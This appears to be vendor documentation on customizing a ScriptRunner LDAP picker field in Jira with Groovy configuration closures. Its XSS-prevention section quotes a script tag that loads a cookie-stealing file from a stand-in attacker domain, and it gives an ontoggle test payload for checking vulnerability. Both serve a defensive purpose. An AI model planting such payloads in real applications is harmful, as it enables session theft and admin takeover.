# LDAP Customizations

- Platform: data-center
- Space: SR4JS
- Hierarchy: features > script-fields > built-in-script-fields > ldap-picker
- Doc ID: doc-sr4js-442886766
- Source: https://docs.adaptavist.com/sr4js/latest/features/script-fields/built-in-script-fields/ldap-picker/ldap-customizations

You can customize the picker in many ways using the _Configuration Script_ option. However, it’s recommended you get the basic functionality of your picker working before you work on advanced customization.

Configure advanced functionality by editing the configuration script, and specifying closures or string values. For operations like rendering the display value, the closure is called (if present), along with any arguments required. The following information explains what happens by default, and what arguments are available to your closure, as well as usage examples.

You do not need to include all possible closure arguments. You can omit superfluous arguments, but you must keep the order. Only drop arguments from the right of the list, for example:

`myClosure = { foo, bar, baz ->`

can be shortened to:

`myClosure = { foo -> // ... }`

Important information regarding picker configuration closures when writing dynamic logic

We cache the configuration closures you write within the scripts for your pickers to enhance performance; [check out our FAQ](https://docs.adaptavist.com/sr4js/latest/get-help/frequently-asked-questions/script-fields-faq#closure-configuration) for more details.

These customizations can be complex. Ensure you thoroughly test on a non-production system.

## Avoiding Cross-Site Scripting Attacks

Cross-Site Scripting (XSS) is a type of vulnerability that arises when a web application renders data as HTML from an untrusted source.

In the example of the database picker, an attacker may enter javascript into a record in your linked database, then select that record in the database picker. That may look like:

```
<script src="http://bad-domain.com/stealCookies.js">An innocent looking record
```

If the database picker rendered the above as HTML, and the attacker persuaded a system admin to view that page, the JavaScript would run. This could allow the attacker to do things like steal cookies or execute REST requests to gain system admin permissions.

To prevent this, the HTML returned by the picker is sanitized, that is, all JavaScript is removed, and any missing HTML tags are inserted.

If you wish to include JavaScript, then you must set `allowJavaScript = true` in your configuration script. However, if you do this, it is then your responsibility to ensure that any values you use from your linked database are sanitized (see example below).

If you are using the current database, then it is easy for the user to enter JavaScript. A project administrator can create Versions whose name contains JavaScript, and users can change their display names to contain scripts tags, and there are many similar examples.

Often no special permissions are required to create objects which can contain JavaScript.

**If you have any doubts, leave `allowJavaScript` unset. If you enable it, you should understand the consequences and test, even in situations where your Jira instance is internal to your company.**

To test, insert the following string anywhere a user might be able to:

```
<details open ontoggle=prompt`12345`>
```

If you then ever see a JavaScript prompt, you are vulnerable to an XSS attack, and you need to fix it.

## Customizing the Displayed Value

By default, we will show the value of the _Display Attribute_ from the LDAP record retrieved.

To customize the display of this value, implement:

```
import groovy.sql.GroovyRowResult

renderViewHtml = { String displayValue, GroovyRowResult row ->
    // return a String that will be displayed when viewing the issue
}
```

**displayValue**

The display value that we calculated

**ldapDataEntry**

An [LdapDataEntry](https://docs.spring.io/spring-ldap/docs/current/apidocs/org/springframework/LdapDataEntry.html)

**active**

A boolean value indicating whether or not the records meet the criteria for an active record (see Dealing with Disabling Options below.)

You can either use that display value and add to it or just display a new value based on the LDAP result.

When viewing the field in _Column_ view in the _Issue Navigator_, we will call `renderColumnHtml` if it is present, which has the same signature as `renderViewHtml`. Use `renderColumnHtml` if you wish to provide a smaller, simpler result suitable for display in a tabular format such as the issue navigator.

For example, to display the location (`l` attribute) as well as the user name:

```
            import org.springframework.LdapDataEntry
            
            renderViewHtml = { String displayValue, LdapDataEntry ldapDataEntry, boolean active ->
                "$displayValue (${ldapDataEntry.attributes.get('l').get()})"
            }
```

### In the Issue Navigator

You may wish to show a simplified display in the grid view of the Issue Navigator, where space is more constrained.

By default we will display the normal "view html" (using the renderer described above if present). To display a simpler representation, implement:

```
import org.springframework.LdapDataEntry

renderColumnHtml = { String displayValue, LdapDataEntry ldapDataEntry, boolean active ->
    // return a String that will be displayed in the list view of the issue navigator
}
```

In Emails, Change History and CSV exports

We can only display plain text (not HTML) in the _History_ tab, email notifications and CSV exports.

By default we will display the value as returned by the SQL query, and not use the renderer described in [Customising the Displayed Value](#id-.LDAPCustomizationsv9.x-customizingthedisplayedvalue).

You should not need to change the value displayed in history and email notifications, but if you need to, then implement:

```
import org.springframework.LdapDataEntry

renderTextOnlyValue = { String displayValue, LdapDataEntry ldapDataEntry, boolean active ->
    // return a string for displaying in issue change history, and emails
}
```

## Customizing the HTML in the Drop-down

By default, we show the _Display Attribute_ in the dropdown. It’s possible to add additional information to this display, which may help guide users to the choice that they are looking for.

Overriding the view HTML, following the section above, has no effect on this display.

### Adding Additional Information to the Drop-down

Following the project picker example again, we can augment the list of items in the drop-down to show the project lead. To do this, implement:

```
import org.springframework.LdapDataEntry

renderOptionHtml = { String displayValue, LdapDataEntry row ->
    // return a String, containing HTML, that will be displayed in the drop-down
}
```

For example, as above, if we wanted to display the user’s location in the drop-down we could use:

```
import org.springframework.LdapDataEntry

renderOptionHtml = { String displayValue, LdapDataEntry ldapDataEntry ->
    "${displayValue} (${ldapDataEntry.attributes.get('l').get()})"
}
```

Which will display as:

![](/sr4js/files/latest/442886766/442886771/1/1758746738000/ldap-customise-dropdown.png)

### Setting a drop-down icon

Often you may have an image for users in your LDAP directory.

You can set the avatar by implementing:

```
import org.springframework.LdapDataEntry

getDropdownIcon = { LdapDataEntry row ->
    // return a String: a link to an icon, or base64 encoded string beginning 'data:image/jpg;base64, '
}
```

For example, to show images for users, where the image is stored in an attribute named `jpegPhoto`:

```
import org.springframework.LdapDataEntry

getDropdownIcon = { LdapDataEntry ldapDataEntry ->
    def photoAttribute = ldapDataEntry.attributes.get('jpegphoto')

    photoAttribute ?
        'data:image/jpg;base64, ' + new String(Base64.getEncoder().encode(photoAttribute.get() as byte[])) :
        null
}
```

which will render as:

![](/sr4js/files/latest/442886766/442886768/1/1758746738000/ldap-customise-icon.png)

## Customizing the Search Filter

There are many cases for customizing the filter used when searching, for instance:

-   Restricting records to just those the current Jira user has permission to see,
    
-   Narrowing to particular `objectTypes` or organizational units,
    
-   Restricting to just those users the current user is managed by, or a manager of.
    

Implement:

```
import com.atlassian.jira.issue.Issue
import org.springframework.ldap.filter.AndFilter

getSearchFilter = { AndFilter currentFilter, Issue issue, String searchValue ->
    // return org.springframework.ldap.filter.Filter. Typically you will add to the supplied AndFilter.
    // Alternately, to search on multiple attributes, return a new filter
}
```

**currentFilter**

An instance of AndFilter, which encompasses the search filter specified in the form, and the clause for narrowing down the results based on what the user has typed

**issue**

The current Issue object which the field is attached to. This is a live issue, in that its values will reflect any typed into the current form

You must return an instance of [`Filter`](https://docs.spring.io/spring-ldap/docs/current/apidocs/org/springframework/ldap/filter/Filter.html). Typically you would do this by adding additional clauses based on issue fields, current user roles or groups etc.

If you override this, you should also modify the validation filter (see below), as otherwise, the user could set a value (either using the REST or Java API) that they would not be able to set through the normal web user interface.

### Setting Search Filter based on Issue Fields

There are some points to be aware of when using the `Issue` object:

-   The `Issue` object which is available to you is never `null`. When the user is interacting with the _Create Issue_ dialog, you can use `issue.issueType` and `issue.projectObject` to get the current issue type and project, but `issue.isCreated()` will be `false`.
    

Note that in both of the following cases, we will use the search filter from the configuration form, rather than the script:

-   When setting a default value via **Admin → Custom Fields**
    
-   When searching for issues in the issue navigator
    

You need to keep the return value from this closure and the search filter in the configuration form in sync…​The search filter in the form should be a superset of all the possible values that can be returned from your customized filter, to allow users to find any possible value.

In the following example, the LDAP search filter is modified according to the value of a custom field named _Organisational Unit_, allowing the end-user to further filter on `ou`:

```
import com.atlassian.jira.issue.Issue
import org.springframework.ldap.filter.EqualsFilter
import org.springframework.ldap.filter.AndFilter

getSearchFilter = { AndFilter currentFilter, Issue issue ->
    def ou = issue.getCustomFieldValue('Organisational Unit') as String
    currentFilter.and(new EqualsFilter('ou', ou))
}
```

If the value of _Organizational Unit_ is empty, the `ou` will be `null`; therefore no results are shown.

The value of the issue attributes change as the user edits the form. So this allow you to return parameterized results based on other field changes that the user is currently making.

### Searching on Multiple Attributes

To search on multiple attributes, for instance both given name and surname, you must implement \`getSearchFilter\` and return a new filter.  
You need to incorporate the filter you have entered into the configuration form, otherwise you may allow a user to choose a value which would not pass validation.  
  
Take our example of matching what the user has typed on both the given and surnames.  
In the code below our _Search Filter_ is simply `` `(objectClass=inetOrgPerson) ``\` so we replicate it in our code.  
The string the user has typed is passed to the closure as \`searchValue\`, we then append a wildcard so that we can do a prefix search of both the surname and given name.

Enter any valid attribute into the configuration form in the _Search attribute_\_field... as we are not making use of the \`currentFilter\` in the closure, we can disregard this.

  
For instance, if a user types the character \`T\`, the closure below would generate a filter whose text representation would look like: `` `(&(objectClass=inetOrgPerson)(|(sn=T)(givenName=T)))` ``

```
import com.atlassian.jira.issue.Issue
import org.springframework.ldap.filter.AndFilter
import org.springframework.ldap.filter.EqualsFilter
import org.springframework.ldap.filter.LikeFilter
import org.springframework.ldap.filter.OrFilter

getSearchFilter = { AndFilter currentFilter, Issue issue, String searchValue ->
    new AndFilter() & new EqualsFilter('objectClass', 'inetOrgPerson') &
        (new OrFilter() | new LikeFilter('givenName', "$searchValue*") | new LikeFilter('sn', "$searchValue*"))
}
```

## Setting the Validation Filter based on Issue Fields

This is pretty much the same as setting the search filter above, and should normally go hand-in-hand with it. Any value that a user could pick through the search dropdown should not be invalid, unless they have subsequently changed other fields on the form that make it invalid.

To set the filter for validation, implement:

```
import com.atlassian.jira.issue.Issue
import org.springframework.ldap.filter.AndFilter

getValidationFilter = { AndFilter currentFilter, Issue issue ->
    // return org.springframework.ldap.filter.Filter. Typically you will add to the supplied AndFilter.
}
```

currentFilter:

An instance of AndFilter, which encompasses the search filter specified in the form. The filter will be executed with a base DN of the DN of the record selected, to determine whether it is valid or not.

Following the above example, this validator checks that the selected value matches the selected organizational unit:

```
import com.atlassian.jira.issue.Issue
import org.springframework.ldap.filter.EqualsFilter
import org.springframework.ldap.filter.AndFilter

getValidationFilter = { AndFilter currentFilter, Issue issue ->
    def ou = issue.getCustomFieldValue('Organisational Unit') as String
    currentFilter.and(new EqualsFilter('ou', ou))
}
```

As, in this case, the code is identical to that used for `getSearchFilter`, you could just extract the body of the closure to a new method.

## Dealing with Disabling Options

In some cases, you may have linked records that become invalid over time. For example, discontinued products, or users who have left the company.

You don’t want these to be selectable on new issues, but you need to retain their value on existing issues.

The method below describes how to disable values in a similar manner to that of select list options. Once an option has been disabled, you cannot use it in new issues. However, if an issue already has that field value, you can continue to save the disabled value. If the field value is changed and saved, the disabled value will no longer show as an option. This behaviour is the least surprising to users, and mirrors the way that the _Disabled Options_ of single/multi-select pickers work.

To handle options that might become disabled, set the main search query in the form to all possible values, not taking into account the attribute that will determine whether they are _active_ or not.

Then use the following closure to return a [`Filter`](https://docs.spring.io/spring-ldap/docs/current/apidocs/org/springframework/ldap/filter/Filter.html), which will be ANDed with the search filter to define those records considered to be _active_.

For example, your search query may be `(objectClass=inetOrgPerson)`, and then specify only users who are not locked out by using:

```
import org.springframework.ldap.filter.PresentFilter

getActiveRecordsFilter = {
    new PresentFilter('pwdAccountLockedTime')
}
```

If you use `getActiveRecordsFilter`, the display attribute used in the form must be a unique identifier for that record, for example `uid` or `sAmAccountName`. Note that you do not need to display this attribute, as you can override it using [Customizing the Displayed Value](#id-.LDAPCustomizationsv9.x-customizingthedisplayedvalue).

### Example

In this scenario, take the example where you want to allow the Jira-user to select from the direct reports of a manager, perhaps the current user. Over time, people’s managers may change, meaning they would not be eligible to be selected for new issues, but we want to retain their value when used on any existing issue.

The `Retrieval/Search Filter` in the form is set to `(objectClass=inetOrgPerson)`, and the configuration script looks like:

```
import org.springframework.LdapDataEntry
import org.springframework.ldap.filter.EqualsFilter

getActiveRecordsFilter = {
    new EqualsFilter('manager', 'cn=Charmian Shuler,ou=Payroll,dc=example,dc=org')
}

renderViewHtml = { String displayValue, LdapDataEntry ldapDataEntry, boolean active ->
    "$displayValue ${active ? '' : '(no longer managed by Charmian)'}"
}
```

Note that if the record has become inactive, a message is added to the _view HTML_.

### Searching using JQL

There are two operators supported when searching, `=` (_equals_) and `~` (_like_).

Use `=` to search by the exact row ID. This will work consistently regardless of whether other values in the linked record have changed. The `=` operator will be used under the hood if you search in the _Basic View_ of the Issue Navigator, using the drop-down.

Use `~` to do fuzzy matching on the textual value of the stored field. For instance if your picker field is linked to a user query, you may use `Customer ~ Smith` to find values such as **John Smith**.

By default, we will index the `displayValue` (as passed to `<<#_customising_the_displayed_value,renderViewHtml>>`), which, as a reminder, is the value of the **display attribute**.

If you wish to be able to do a textual search on something different from the above, you need to specify what should be indexed. It only makes sense to index what is actually shown on the issue, minus any HTML used for presentation purposes. In most cases, it should not be necessary to implement this at all.

To modify what is indexed, implement:

```
import org.springframework.LdapDataEntry

getIndexValue = { LdapDataEntry entry ->
    // return a string (perhaps one or more attributes) to be used for indexing, for textual searching and sorting in JQL queries
}
```

For example, if you are querying from users, to index only the surname you would use:

```
import org.springframework.LdapDataEntry

getIndexValue = { LdapDataEntry entry ->
    entry.attributes.get('sn').get()
}
```

  

There will be a small overhead to this indexing, as a query to the external resource will be done each time the issue is re-indexed. In a full re-index, a query will be made for each field that has a value, for each issue.

You can disable the textual indexing by setting:

```
disableTextIndexing = true
```

However if you do this queries using the `~` operator will not return anything.

If you change the indexed value, you will not get accurate sorting results until all issues with this field are reindexed.

You could do that by using the [reindex issues](https://docs.adaptavist.com/sr4js/latest/features/built-in-scripts/re-index-issues) script with a JQL query similar to `MyPickerField is not empty`. Or, a full reindex.

### Miscellaneous Configuration

##### Multiple Values Delimiter

Multiple values are separated with a comma. To change this set `multiValueDelimiter` to a string. For example, if you are rendering values as lozenges, you might set this to the empty string, or to set the joiner to a `|` add the following:

```
multiValueDelimiter = "|"
```

##### Number of Values in Drop-Down

By default, a maximum of `30` values will be retrieved and displayed in the drop-down. To change that set `maxRecordsForSearch` to a number.
